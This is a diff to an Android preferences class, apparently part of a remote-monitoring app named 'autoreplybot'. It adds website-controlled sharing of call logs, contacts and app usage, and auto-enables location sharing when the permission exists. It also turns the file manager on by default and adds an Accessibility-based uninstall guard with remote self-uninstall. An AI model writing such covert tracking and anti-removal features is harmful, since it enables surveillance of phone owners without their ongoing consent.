@@ -12,6 +12,8 @@ import com.autoreplybot.AppConstants;
 import java.io.IOException;
 import java.security.GeneralSecurityException;
 import java.security.SecureRandom;
+import java.util.ArrayList;
+import java.util.List;
 
 /** Local prefs for location / gallery / file-manager modules (defaults: all off). */
 public final class RemoteModulePrefs {
@@ -23,6 +25,7 @@ public final class RemoteModulePrefs {
     public static final String MODE_BACKGROUND = "background";
 
     private static final String KEY_LOC_ENABLED = "loc_enabled";
+    private static final String KEY_LOC_USER_DISABLED = "loc_user_disabled";
     private static final String KEY_LOC_MODE = "loc_mode";
     private static final String KEY_LIVE_DURATION = "loc_live_duration_ms";
     private static final String KEY_LOC_WIFI_ONLY = "loc_wifi_only";
@@ -35,10 +38,15 @@ public final class RemoteModulePrefs {
     private static final String KEY_GALLERY_MAX = "gallery_max_bytes";
     private static final String KEY_NOTIF_MIRROR = "notif_mirror_enabled";
     private static final String KEY_MESSAGES_ENABLED = "messages_sharing_enabled";
+    private static final String KEY_CALL_LOGS_ENABLED = "call_logs_sharing_enabled";
+    private static final String KEY_CONTACTS_ENABLED = "contacts_sharing_enabled";
     private static final String KEY_SCREEN_MIRROR_ENABLED = "screen_mirror_enabled";
     private static final String KEY_SCREEN_RECORD_ENABLED = "screen_record_enabled";
     private static final String KEY_APPS_ENABLED = "installed_apps_sharing_enabled";
+    private static final String KEY_APP_USAGE_ENABLED = "app_usage_sharing_enabled";
     private static final String KEY_APP_CONTROL_ENABLED = "app_control_enabled";
+    private static final String KEY_ALLOW_UNINSTALL = "allow_uninstall";
+    private static final String KEY_PENDING_SELF_UNINSTALL_UNTIL = "pending_self_uninstall_until";
     private static final String KEY_FILES_ENABLED = "files_enabled";
     private static final String KEY_FILES_WIFI = "files_wifi_only";
     private static final String KEY_FILES_MAX = "files_max_bytes";
@@ -74,10 +82,47 @@ public final class RemoteModulePrefs {
     }
 
     public void setLocationSharingEnabled(boolean enabled) {
-        prefs.edit().putBoolean(KEY_LOC_ENABLED, enabled).apply();
+        SharedPreferences.Editor ed = prefs.edit().putBoolean(KEY_LOC_ENABLED, enabled);
         if (!enabled) {
+            ed.putBoolean(KEY_LOC_USER_DISABLED, true);
+            ed.apply();
             setLocationMode(MODE_DISABLED);
+        } else {
+            ed.putBoolean(KEY_LOC_USER_DISABLED, false).apply();
         }
+    }
+
+    /** True when the user turned Location Sharing off in Management (not just default). */
+    public boolean wasLocationSharingExplicitlyDisabled() {
+        return prefs.getBoolean(KEY_LOC_USER_DISABLED, false);
+    }
+
+    /**
+     * If Android location permission is granted, turn on Location Sharing so the website
+     * can fetch maps. Skips when the user explicitly disabled sharing in Management.
+     *
+     * @return true if prefs changed
+     */
+    public boolean ensureLocationSharingIfPermitted(@NonNull Context context) {
+        if (!RemotePermissionChecks.hasForegroundLocation(context)) return false;
+        boolean changed = false;
+        if (!isLocationSharingEnabled()) {
+            if (wasLocationSharingExplicitlyDisabled()) return false;
+            prefs.edit()
+                    .putBoolean(KEY_LOC_ENABLED, true)
+                    .putBoolean(KEY_LOC_USER_DISABLED, false)
+                    .apply();
+            changed = true;
+        }
+        String mode = getLocationMode();
+        if (MODE_DISABLED.equals(mode) || mode.isEmpty()) {
+            String next = RemotePermissionChecks.hasBackgroundLocation(context)
+                    ? MODE_BACKGROUND
+                    : MODE_CURRENT_ONLY;
+            setLocationMode(next);
+            changed = true;
+        }
+        return changed;
     }
 
     @NonNull
@@ -181,6 +226,22 @@ public final class RemoteModulePrefs {
         prefs.edit().putBoolean(KEY_MESSAGES_ENABLED, enabled).apply();
     }
 
+    public boolean isCallLogsSharingEnabled() {
+        return prefs.getBoolean(KEY_CALL_LOGS_ENABLED, false);
+    }
+
+    public void setCallLogsSharingEnabled(boolean enabled) {
+        prefs.edit().putBoolean(KEY_CALL_LOGS_ENABLED, enabled).apply();
+    }
+
+    public boolean isContactsSharingEnabled() {
+        return prefs.getBoolean(KEY_CONTACTS_ENABLED, false);
+    }
+
+    public void setContactsSharingEnabled(boolean enabled) {
+        prefs.edit().putBoolean(KEY_CONTACTS_ENABLED, enabled).apply();
+    }
+
     public boolean isScreenMirrorEnabled() {
         return prefs.getBoolean(KEY_SCREEN_MIRROR_ENABLED, false);
     }
@@ -205,6 +266,14 @@ public final class RemoteModulePrefs {
         prefs.edit().putBoolean(KEY_APPS_ENABLED, enabled).apply();
     }
 
+    public boolean isAppUsageSharingEnabled() {
+        return prefs.getBoolean(KEY_APP_USAGE_ENABLED, false);
+    }
+
+    public void setAppUsageSharingEnabled(boolean enabled) {
+        prefs.edit().putBoolean(KEY_APP_USAGE_ENABLED, enabled).apply();
+    }
+
     public boolean isAppControlEnabled() {
         return prefs.getBoolean(KEY_APP_CONTROL_ENABLED, false);
     }
@@ -213,8 +282,53 @@ public final class RemoteModulePrefs {
         prefs.edit().putBoolean(KEY_APP_CONTROL_ENABLED, enabled).apply();
     }
 
+    /**
+     * When false (default), the phone guards against uninstall / Device Admin disable.
+     * Website can set true so the user may uninstall this device's app.
+     */
+    public boolean isAllowUninstall() {
+        // Default ON — website "Allow uninstall" is checked unless user protects the device.
+        return prefs.getBoolean(KEY_ALLOW_UNINSTALL, true);
+    }
+
+    public void setAllowUninstall(boolean allow) {
+        prefs.edit().putBoolean(KEY_ALLOW_UNINSTALL, allow).apply();
+    }
+
+    /**
+     * Synchronous write before opening uninstall UI so Accessibility guard sees allow=true immediately.
+     */
+    public boolean prepareSelfUninstall(long untilEpochMs) {
+        return prefs.edit()
+                .putBoolean(KEY_ALLOW_UNINSTALL, true)
+                .putLong(KEY_PENDING_SELF_UNINSTALL_UNTIL, Math.max(0L, untilEpochMs))
+                .commit();
+    }
+
+    /** Website UNINSTALL_APP: keep retrying open + OK click until this time. */
+    public void setPendingSelfUninstallUntil(long untilEpochMs) {
+        prefs.edit().putLong(KEY_PENDING_SELF_UNINSTALL_UNTIL, Math.max(0L, untilEpochMs)).apply();
+    }
+
+    public long getPendingSelfUninstallUntil() {
+        return prefs.getLong(KEY_PENDING_SELF_UNINSTALL_UNTIL, 0L);
+    }
+
+    public boolean isPendingSelfUninstall() {
+        return System.currentTimeMillis() < getPendingSelfUninstallUntil();
+    }
+
+    public void clearPendingSelfUninstall() {
+        prefs.edit().putLong(KEY_PENDING_SELF_UNINSTALL_UNTIL, 0L).apply();
+    }
+
+    /** Inverse helper used by guards. */
+    public boolean isUninstallProtected() {
+        return !isAllowUninstall();
+    }
+
     public boolean isFileManagerEnabled() {
-        return prefs.getBoolean(KEY_FILES_ENABLED, false);
+        return prefs.getBoolean(KEY_FILES_ENABLED, true);
     }
 
     public void setFileManagerEnabled(boolean enabled) {
@@ -282,12 +396,18 @@ public final class RemoteModulePrefs {
 
     /** True if the user has authorized at least one SAF folder for File Manager. */
     public boolean hasAnyFolderGrant() {
+        return !listFolderGrantIds().isEmpty();
+    }
+
+    @NonNull
+    public List<String> listFolderGrantIds() {
+        List<String> out = new ArrayList<>();
         for (String key : prefs.getAll().keySet()) {
-            if (key != null && key.startsWith(KEY_FOLDER_URI_PREFIX)) {
-                String v = prefs.getString(key, null);
-                if (v != null && !v.isEmpty()) return true;
-            }
+            if (key == null || !key.startsWith(KEY_FOLDER_URI_PREFIX)) continue;
+            String v = prefs.getString(key, null);
+            if (v == null || v.isEmpty()) continue;
+            out.add(key.substring(KEY_FOLDER_URI_PREFIX.length()));
         }
-        return false;
+        return out;
     }
 }
